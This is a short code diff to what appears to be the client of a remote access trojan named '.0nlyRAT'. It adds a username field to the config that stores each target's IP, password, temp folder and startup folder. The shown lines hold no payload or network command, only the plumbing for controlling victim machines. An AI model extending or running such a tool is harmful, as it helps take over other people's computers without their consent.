@@ -61,6 +61,7 @@ local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyR
 
 IP_KEY = "IPADDRESS"
 PASS_KEY = "PASSWORD"
+USERNAME_KEY = "USERNAME"
 TEMPDIR_KEY = "TEMPDIR"
 STARTUPDIR_KEY = "STARTUPDIR"
 
@@ -71,8 +72,9 @@ def read_config(config_file):
     read_lines = open(config_file, "r").readlines()
     configuration[IP_KEY] = read_lines[0].strip()
     configuration[PASS_KEY] = read_lines[1].strip()
-    configuration[TEMPDIR_KEY] = read_lines[2].replace("\\","/").strip()
-    configuration[STARTUPDIR_KEY] = read_lines[3].replace("\\","/").strip()
+    configuration[USERNAME_KEY] = read_lines[2].strip()
+    configuration[TEMPDIR_KEY] = read_lines[3].replace("\\","/").strip()
+    configuration[STARTUPDIR_KEY] = read_lines[4].replace("\\","/").strip()
     return configuration
 
 # remotely connect to target
@@ -141,6 +143,7 @@ def cli(arguments):
                 exit()
             tgt_ipv4 = configuration.get(IP_KEY)
             tgt_pword = configuration.get(PASS_KEY)
+            tgt_uname = configuration.get(USERNAME_KEY)
             tgt_td = configuration.get(TEMPDIR_KEY)
             tgt_sd = configuration.get(STARTUPDIR_KEY)
             print(options_menu)
